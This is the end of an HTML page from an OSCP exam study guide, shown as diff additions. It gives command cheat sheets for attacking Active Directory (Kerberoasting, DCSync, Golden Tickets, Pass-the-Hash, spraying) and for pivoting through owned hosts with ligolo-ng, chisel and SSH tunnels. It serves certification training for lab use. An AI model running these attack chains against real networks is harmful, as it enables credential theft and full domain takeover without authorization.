+<pre><code>bloodhound-python -u $U -p $P -d $DOMAIN -ns $DC -c all --zip     # collect from Kali (do it as soon as you have any cred)
+# or on a Windows host:  SharpHound.exe -c all   → copy the zip to Kali</code></pre>
+<p><strong>Then:</strong> open the BloodHound GUI, import the zip, mark your owned accounts as &quot;Owned&quot;, and run the built-in queries &quot;Shortest paths to Domain Admins&quot; and &quot;Shortest paths from Owned&quot;. Each <strong>arrow</strong> maps to an abuse recipe in <code class="tag">[AD-ACL]</code>.</p>
+<p><strong>Troubleshoot:</strong> collection fails → clock skew, wrong <code>-ns</code>/<code>-d</code>, or LDAP signing; GUI import errors → match the collector and GUI versions.</p>
+<h2 id="v7-[ad-attack-path]-how-a-typical-exam-chain-looks">[AD-ATTACK-PATH]  how a typical exam chain looks<a class="anchor" href="#v7-[ad-attack-path]-how-a-typical-exam-chain-looks">#</a></h2>
+<pre><code>start: assumed-breach credential
+ → run BloodHound + Kerberoast + AS-REP + spray
+ → crack a service/user password → reuse it → become local admin on a host
+ → secretsdump that host → more hashes/creds → BloodHound &quot;from owned&quot;
+ → abuse an ACL edge (GenericAll / WriteDACL / Shadow-Creds) up to a privileged user
+ → that user can DCSync (or is a Domain Admin) → secretsdump the domain
+ → Pass-the-Hash the Administrator into the DC and members → read every proof.txt</code></pre>
+<p><strong>Priorities:</strong> always do the two free roasts + BloodHound first; always spray every new cred on every host; let BloodHound pick the path; take the shortest edge you can run with your Kali tools.</p>
+<h2 id="v7-[kerberos-quick]-kerberos-cheat-strip">[KERBEROS-QUICK]  Kerberos cheat-strip<a class="anchor" href="#v7-[kerberos-quick]-kerberos-cheat-strip">#</a></h2>
+<pre><code>Clock:        sudo ntpdate $DC                                            # fix KRB_AP_ERR_SKEW FIRST
+AS-REP:       GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $DC   → crack -m 18200
+Kerberoast:   GetUserSPNs -request $DOMAIN/$U:$P -dc-ip $DC                   → crack -m 13100
+Hash→Ticket:  getTGT.py $DOMAIN/$U -hashes :$H ; export KRB5CCNAME=$U.ccache ; then use -k -no-pass
+DCSync:       secretsdump.py $DOMAIN/$U:$P@$DC
+Golden Ticket:ticketer.py -nthash &lt;krbtgt hash&gt; -domain-sid &lt;domain SID&gt; -domain $DOMAIN administrator</code></pre>
+<h2 id="v7-[ad-troubleshooting]">[AD-TROUBLESHOOTING]<a class="anchor" href="#v7-[ad-troubleshooting]">#</a></h2>
+<div class="tablewrap"><table><thead><tr><th>What you see</th><th>Cause / fix</th></tr></thead><tbody>
+<tr><td><code>KRB_AP_ERR_SKEW</code></td><td>clock skew → <code>sudo ntpdate $DC</code></td></tr>
+<tr><td><code>STATUS_LOGON_FAILURE</code></td><td>wrong creds/domain → try <code>-d $DOMAIN</code> or <code>$DOMAIN/user</code>; check case</td></tr>
+<tr><td><code>STATUS_ACCOUNT_RESTRICTION</code></td><td>that account can&#x27;t log on to that host/protocol</td></tr>
+<tr><td><code>STATUS_PASSWORD_EXPIRED</code></td><td>reset it via <code>smbpasswd</code>/<code>rpc password</code> if allowed</td></tr>
+<tr><td>Kerberoast returns nothing</td><td>no SPN accounts, or you forgot <code>-request</code> + a valid cred</td></tr>
+<tr><td>PtH fails on WinRM but SMB says Pwn3d</td><td>the account lacks WinRM rights → use psexec/wmiexec</td></tr>
+<tr><td>BloodHound collection fails</td><td>clock skew, LDAP signing, or wrong <code>-ns</code></td></tr>
+<tr><td><code>secretsdump</code> DCSync &quot;denied&quot;</td><td>your account lacks replication rights — wrong path</td></tr>
+<tr><td>relay says &quot;signing:True&quot;</td><td>can&#x27;t NTLM-relay to a host with SMB signing on → find a <code>signing:False</code> host</td></tr>
+</tbody></table></div>
+<h2 id="v7-[common-rabbit-holes-ad]">[COMMON-RABBIT-HOLES ad]<a class="anchor" href="#v7-[common-rabbit-holes-ad]">#</a></h2>
+<ul>
+<li>Grinding a Kerberoast hash that won&#x27;t crack instead of trying other users/edges.</li>
+<li>Ignoring BloodHound and hunting the path by hand.</li>
+<li>Forgetting to spray a newly found password on <strong>all</strong> hosts.</li>
+<li>Trying to locally-privesc a host when the real path is &quot;these creds are admin on *another* host&quot; or an ACL edge.</li>
+<li>Not fixing clock skew and blaming your credentials.</li>
+</ul>
+<hr>
+<h1 id="v7-[pivot]-pivoting-reaching-networks-only-the-victim-can-see">[PIVOT]  PIVOTING — reaching networks only the victim can see<a class="anchor" href="#v7-[pivot]-pivoting-reaching-networks-only-the-victim-can-see">#</a></h1>
+<blockquote><strong>What is pivoting?</strong> Some machines have two network cards: one facing you, one facing a hidden internal network you can&#x27;t reach directly. Once you own such a &quot;dual-homed&quot; machine, you tunnel *through* it so your Kali tools can attack the hidden subnet. That machine is the &quot;pivot&quot;.</blockquote>
+<h2 id="v7-[pivot-quick]-the-two-tools-you-need-one-screen">[PIVOT-QUICK]  the two tools you need  (one screen)<a class="anchor" href="#v7-[pivot-quick]-the-two-tools-you-need-one-screen">#</a></h2>
+<pre><code>Picture:  YOUR KALI  →(tunnel)→  PIVOT HOST (owned, dual-homed)  →  HIDDEN SUBNET (e.g. 172.16.5.x)
+
+LIGOLO-NG (cleanest — gives you a real network route; no proxychains needed):
+  ./proxy -selfcert                              # on KALI: start the ligolo relay
+  sudo ip route add 172.16.5.0/24 dev ligolo     # on KALI: route the hidden subnet through the tunnel
+  ./agent -connect &lt;IP&gt;:11601 -ignore-cert       # on the PIVOT host: connect back to your relay
+  # in the ligolo console: session → start. Now run nmap/nxc against 172.16.5.x NATIVELY.
+
+CHISEL (creates a SOCKS proxy you run tools through with proxychains):
+  ./chisel server -p 8000 --reverse              # on KALI
+  ./chisel client &lt;IP&gt;:8000 R:socks              # on the PIVOT host
+  proxychains nxc smb 172.16.5.0/24              # prefix any tool with &#x27;proxychains&#x27; to send it through the tunnel
+
+SSH (if you have SSH creds on the pivot):
+  ssh -D 1080 user@pivot                          # a SOCKS proxy → use with proxychains
+  ssh -L 9000:172.16.5.10:445 user@pivot          # forward ONE internal host:port to your localhost:9000</code></pre>
+<p><strong>Rule:</strong> through a SOCKS proxy, use <strong>TCP-connect</strong> scans only: <code>proxychains nmap -sT -Pn -n 172.16.5.10</code>. No UDP or ping over SOCKS.</p>
+<h2 id="v7-[pivot-ssh]-ssh-port-forwarding-get-the-direction-right">[PIVOT-SSH]  SSH port forwarding (get the direction right)<a class="anchor" href="#v7-[pivot-ssh]-ssh-port-forwarding-get-the-direction-right">#</a></h2>
+<ul>
+<li>**Local (<code>-L</code>):<strong> opens a port </strong>on your Kali** that tunnels to an internal <code>host:port</code> through the pivot. Use when *you* start the connection. <code>ssh -L 8080:internal-web:80 user@pivot</code> → browse <code>localhost:8080</code>.</li>
+<li>**Remote (<code>-R</code>):<strong> opens a port </strong>on the far side** that tunnels back to something *you* can reach. Use to expose your Kali listener to a segmented box.</li>
+<li>**Dynamic (<code>-D</code>):** a SOCKS proxy on Kali → run anything through proxychains. Best general option if you have SSH.</li>
+<li>Handy flags: <code>-N</code> (no shell), <code>-f</code> (background).</li>
+</ul>
+<h2 id="v7-[pivot-chisel]-details">[PIVOT-CHISEL]  details<a class="anchor" href="#v7-[pivot-chisel]-details">#</a></h2>
+<ul>
+<li>Reverse SOCKS (the pivot can&#x27;t accept inbound but can reach you): <code>--reverse</code> server on Kali, <code>R:socks</code> client on the pivot. proxychains uses <code>socks5 127.0.0.1 1080</code>.</li>
+<li>Single port forward: <code>R:9000:172.16.5.10:3389</code> → RDP to <code>localhost:9000</code>.</li>
+<li>Transfer chisel to the pivot (<code class="tag">[FILETRANSFER-QUICK]</code>); match the architecture (linux/windows, x64).</li>
+</ul>
+<h2 id="v7-[pivot-ligolo]-details-preferred">[PIVOT-LIGOLO]  details (preferred)<a class="anchor" href="#v7-[pivot-ligolo]-details-preferred">#</a></h2>
+<ul>
+<li>Gives you a routed interface, so you run <code>nmap</code>/<code>nxc</code>/<code>evil-winrm</code> <strong>natively</strong> against the internal subnet (faster, and UDP works).</li>
+<li>Kali setup: <code>sudo ip tuntap add user $USER mode tun ligolo; sudo ip link set ligolo up; ./proxy -selfcert</code>.</li>
+<li>Add a route for the hidden subnet to <code>dev ligolo</code>, then start the agent&#x27;s session.</li>
+<li>To catch reverse shells from internal hosts, use ligolo&#x27;s listener feature to expose your Kali listener to them.</li>
+</ul>
+<h2 id="v7-[pivot-enum]-what-to-do-after-you-pivot">[PIVOT-ENUM]  what to do after you pivot<a class="anchor" href="#v7-[pivot-enum]-what-to-do-after-you-pivot">#</a></h2>
+<ol>
+<li>Find live hosts: <code>proxychains nxc smb 172.16.5.0/24</code> (or native with ligolo).</li>
+<li>Port-scan them (TCP connect): <code>proxychains nmap -sT -Pn -n -p 445,3389,5985,88 172.16.5.10</code>.</li>
+<li>Spray your creds/hashes across the new subnet; if it&#x27;s AD, re-run BloodHound from the new perspective.</li>
+</ol>
+<h2 id="v7-[pivot-troubleshooting]">[PIVOT-TROUBLESHOOTING]<a class="anchor" href="#v7-[pivot-troubleshooting]">#</a></h2>
+<div class="tablewrap"><table><thead><tr><th>What you see</th><th>Cause / fix</th></tr></thead><tbody>
+<tr><td>proxychains &quot;connection refused&quot;</td><td>SOCKS not up / wrong port in <code>proxychains4.conf</code> (<code>socks5 127.0.0.1 1080</code>)</td></tr>
+<tr><td>nmap through proxychains hangs</td><td>you used SYN/UDP → must be <code>-sT -Pn -n</code>; scan few ports</td></tr>
+<tr><td>DNS fails through the proxy</td><td>use IPs, or add hosts to <code>/etc/hosts</code></td></tr>
+<tr><td>chisel client won&#x27;t connect</td><td>pivot egress blocked → use port 80/443; confirm server <code>--reverse</code></td></tr>
+<tr><td>ligolo: no traffic</td><td>you forgot <code>ip route add &lt;subnet&gt; dev ligolo</code>, or didn&#x27;t start the session</td></tr>
+<tr><td>reverse shell from internal host never arrives</td><td>your listener isn&#x27;t reachable → expose Kali via ligolo listener / chisel <code>R:</code></td></tr>
+<tr><td>binary won&#x27;t run</td><td>wrong architecture — get linux-amd64 / windows-amd64</td></tr>
+</tbody></table></div>
+<h2 id="v7-[common-rabbit-holes-pivot]">[COMMON-RABBIT-HOLES pivot]<a class="anchor" href="#v7-[common-rabbit-holes-pivot]">#</a></h2>
+<ul>
+<li>SYN/UDP scanning over SOCKS (doesn&#x27;t work). Scanning huge port ranges through a proxy (glacially slow — target specific ports). Forgetting the ligolo route. Wrong tunnel direction (<code>-L</code> vs <code>-R</code>). Not re-spraying creds on the new subnet.</li>
+</ul>
+<hr>
+<p>*End Volume 5. Next: Volume 6 — quick lookups, troubleshooting, the tool encyclopedia, and the exam report.*</p></section></main>
+  </div>
+</div>
+<button id="totop" onclick="window.scrollTo({top:0,behavior:'smooth'})" title="Top">↑</button>
+<script>
+function toggleTheme(){var h=document.documentElement,t=h.getAttribute('data-theme')==='dark'?'light':'dark';h.setAttribute('data-theme',t);try{localStorage.setItem('oscpkb-theme',t)}catch(e){}}
+try{var s=localStorage.getItem('oscpkb-theme');if(s)document.documentElement.setAttribute('data-theme',s)}catch(e){}
+var content=document.getElementById('content'),searchBox=document.getElementById('search'),countEl=document.getElementById('count');
+var marks=[],cur=-1;
+function clearMarks(){marks.forEach(function(m){var p=m.parentNode;p.replaceChild(document.createTextNode(m.textContent),m);p.normalize();});marks=[];cur=-1;countEl.textContent='';}
+function clearSearch(){searchBox.value='';clearMarks();searchBox.focus();}
+function doSearch(){clearMarks();var q=searchBox.value.trim();if(q.length<2)return;var rx=new RegExp(q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'gi');var wk=document.createTreeWalker(content,NodeFilter.SHOW_TEXT,{acceptNode:function(n){if(!n.nodeValue.trim())return NodeFilter.FILTER_REJECT;var t=n.parentNode.tagName;if(t==='SCRIPT'||t==='STYLE')return NodeFilter.FILTER_REJECT;return rx.test(n.nodeValue)?NodeFilter.FILTER_ACCEPT:NodeFilter.FILTER_REJECT;}});var tg=[],node;while(node=wk.nextNode())tg.push(node);tg.forEach(function(n){rx.lastIndex=0;var frag=document.createDocumentFragment(),last=0,s=n.nodeValue,m;while(m=rx.exec(s)){if(m.index>last)frag.appendChild(document.createTextNode(s.slice(last,m.index)));var mk=document.createElement('mark');mk.textContent=m[0];frag.appendChild(mk);marks.push(mk);last=m.index+m[0].length;if(m.index===rx.lastIndex)rx.lastIndex++;}if(last<s.length)frag.appendChild(document.createTextNode(s.slice(last)));n.parentNode.replaceChild(frag,n);});countEl.textContent=marks.length?('0/'+marks.length):'0 hits';if(marks.length){cur=-1;jump(1);}}
+function jump(d){if(!marks.length)return;if(cur>=0)marks[cur].classList.remove('current');cur=(cur+d+marks.length)%marks.length;var m=marks[cur];m.classList.add('current');m.scrollIntoView({behavior:'smooth',block:'center'});countEl.textContent=(cur+1)+'/'+marks.length;}
+var deb;searchBox.addEventListener('input',function(){clearTimeout(deb);deb=setTimeout(doSearch,180);});
+searchBox.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();jump(e.shiftKey?-1:1);}if(e.key==='Escape'){clearSearch();}});
+document.addEventListener('keydown',function(e){if(e.key==='/'&&document.activeElement!==searchBox&&(document.activeElement.id!=='navfilter')){e.preventDefault();searchBox.focus();}});
+content.addEventListener('click',function(e){if(e.target.classList.contains('tag')){searchBox.value=e.target.textContent;doSearch();}});
+var nf=document.getElementById('navfilter');nf.addEventListener('input',function(){var q=this.value.toLowerCase();document.querySelectorAll('#nav .navlink').forEach(function(a){a.style.display=(!q||a.textContent.toLowerCase().indexOf(q)>=0)?'':'none';});});
+var totop=document.getElementById('totop');window.addEventListener('scroll',function(){totop.style.display=window.scrollY>500?'block':'none';});
+document.getElementById('nav').addEventListener('click',function(e){if(e.target.classList.contains('navlink')&&window.innerWidth<=900)document.getElementById('sidebar').classList.remove('open');});
+</script>
+</body>
+</html>
